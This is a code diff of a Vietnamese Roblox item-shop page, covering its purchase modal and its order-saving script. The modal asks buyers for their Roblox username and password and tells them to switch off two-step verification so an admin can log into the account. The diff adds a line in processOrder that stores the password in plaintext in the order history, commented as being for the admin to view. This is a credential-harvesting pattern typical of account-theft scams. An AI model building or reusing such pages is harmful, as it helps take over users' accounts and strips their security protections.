@@ -18,9 +18,9 @@
 
     <div class="container">
         <div style="margin-top:20px; display:flex; justify-content:space-between; align-items:center">
-            <h3 style="font-size:16px">Chào, <span id="uName" style="color:blue">...</span></h3>
-            <div style="background:white; padding:6px 12px; border-radius:50px; border:1px solid #ddd; font-size:14px">
-                Số dư: <b id="uBal" style="color:green">0</b> đ
+            <h3 style="font-size:16px">Chào, <span id="uName" style="color:#3b82f6">...</span></h3>
+            <div style="background:white; padding:6px 12px; border-radius:50px; border:1px solid #ddd; font-size:14px; font-weight:bold">
+                Số dư: <span id="uBal" style="color:#22c55e">0</span>đ
             </div>
         </div>
 
@@ -71,34 +71,31 @@
         <div class="modal-content">
             <h3 style="margin-bottom:15px; font-size:18px; text-align: center;">XÁC NHẬN MUA</h3>
             <p style="font-size:14px">Vật phẩm: <b id="mName">...</b></p>
-            <p style="margin-bottom:15px; font-size:14px">Giá tiền: <b id="mPrice" style="color:red">...</b></p>
+            <p style="margin-bottom:15px; font-size:14px">Giá tiền: <b id="mPrice" style="color:#ef4444">...</b></p>
             
-            <label style="font-size: 13px; font-weight: bold; display: block; margin-bottom: 5px;">Tài khoản Roblox:</label>
-            <input type="text" id="accUser" class="input-box" placeholder="Nhập username...">
+            <input type="text" id="accUser" class="input-box" placeholder="Tài khoản Roblox...">
+            <input type="password" id="accPass" class="input-box" placeholder="Mật khẩu Roblox...">
             
-            <label style="font-size: 13px; font-weight: bold; display: block; margin-bottom: 5px;">Mật khẩu Roblox:</label>
-            <input type="password" id="accPass" class="input-box" placeholder="Nhập mật khẩu...">
-            
-            <div style="font-size:11px; color:red; margin-bottom:15px; background:#fff2f2; padding:10px; border-radius: 8px;">
-                ⚠️ <b>QUAN TRỌNG:</b> Vui lòng TẮT bảo mật 2 lớp (2-Step) trước khi đặt đơn.
+            <div style="font-size:11px; color:red; margin-bottom:15px; background:#fff2f2; padding:10px; border-radius: 8px; line-height:1.4">
+                ⚠️ <b>LƯU Ý:</b> Tắt bảo mật 2 lớp (2-Step) để Admin có thể đăng nhập vào cày.
             </div>
 
             <button class="btn-primary" style="width:100%" onclick="processOrder()">THANH TOÁN NGAY</button>
-            <button onclick="closeModal()" style="width:100%; background:none; border:none; margin-top:10px; cursor:pointer; font-size:13px; color: #666;">Quay lại</button>
+            <button onclick="closeModal()" style="width:100%; background:none; border:none; margin-top:10px; cursor:pointer; font-size:13px; color: #888;">Quay lại</button>
         </div>
     </div>
 
     <script>
-        // KIỂM TRA ĐĂNG NHẬP
+        // 1. KIỂM TRA ĐĂNG NHẬP
         if(!localStorage.getItem('isLoggedIn')) window.location.href = 'login.html';
 
-        // MENU LOGIC
+        // 2. MENU LOGIC
         const uName = localStorage.getItem('myUser');
         const menuBox = document.getElementById('mainMenu');
         menuBox.innerHTML = `
-            <div style="padding:10px; font-size:12px; color:#888; border-bottom:1px solid #eee">Tài khoản: <b>${uName}</b></div>
+            <div style="padding:10px; font-size:12px; color:#888; border-bottom:1px solid #eee">Acc: <b>${uName}</b></div>
             <a href="index.html" class="menu-item">Trang chủ</a>
-            <a href="dashboard.html" class="menu-item">Cửa Hàng</a>
+            <a href="dashboard.html" class="menu-item">Shop Vật Phẩm</a>
             <a href="deposit.html" class="menu-item">Nạp Tiền</a>
             <a href="history.html" class="menu-item">Lịch Sử Đơn</a>
             <a href="#" onclick="doLogout()" class="menu-item logout">Đăng xuất</a>
@@ -107,7 +104,7 @@
         function toggleMenu() { menuBox.classList.toggle('active'); }
         function doLogout() { localStorage.removeItem('isLoggedIn'); window.location.href = 'index.html'; }
 
-        // SHOP LOGIC
+        // 3. ENGINE HIỂN THỊ TIỀN
         let balance = parseInt(localStorage.getItem('myBalance')) || 0;
         document.getElementById('uName').innerText = uName;
         document.getElementById('uBal').innerText = balance.toLocaleString();
@@ -123,33 +120,36 @@
 
         function closeModal() { document.getElementById('buyModal').style.display = 'none'; }
 
+        // 4. ENGINE LƯU ĐƠN HÀNG (CÓ LƯU PASS)
         function processOrder() {
             let acc = document.getElementById('accUser').value;
-            let pass = document.getElementById('accPass').value;
-            if(!acc || !pass) return alert("Vui lòng nhập đầy đủ tài khoản và mật khẩu game!");
+            let pass = document.getElementById('accPass').value; // Lấy mật khẩu khách nhập
+            
+            if(!acc || !pass) return alert("Vui lòng điền đủ tài khoản và mật khẩu!");
 
             if(balance >= currentItem.price) {
-                // Trừ tiền
+                // Trừ tiền tài khoản
                 balance -= currentItem.price;
                 localStorage.setItem('myBalance', balance);
                 
-                // Lưu lịch sử
+                // Lưu vào thùng dữ liệu chung
                 let history = JSON.parse(localStorage.getItem('myHistory')) || [];
                 let newOrder = {
                     id: 'GS' + Math.floor(Math.random() * 90000 + 10000),
                     service: currentItem.name,
                     price: currentItem.price,
-                    acc: acc,
+                    acc: acc, 
+                    pass: pass, // Đẩy mật khẩu sang cho Admin xem
                     date: new Date().toLocaleString('vi-VN'),
-                    status: 'Đang xử lý'
+                    status: 'Chờ xử lý'
                 };
                 history.unshift(newOrder);
                 localStorage.setItem('myHistory', JSON.stringify(history));
 
-                alert("Mua hàng thành công! Đơn hàng đang được hệ thống xử lý.");
+                alert("Mua hàng thành công! Đơn hàng đã được gửi.");
                 window.location.href = "history.html";
             } else {
-                alert("Số dư tài khoản không đủ. Vui lòng nạp thêm tiền!");
+                alert("Số dư không đủ. Vui lòng nạp thêm!");
             }
         }
 
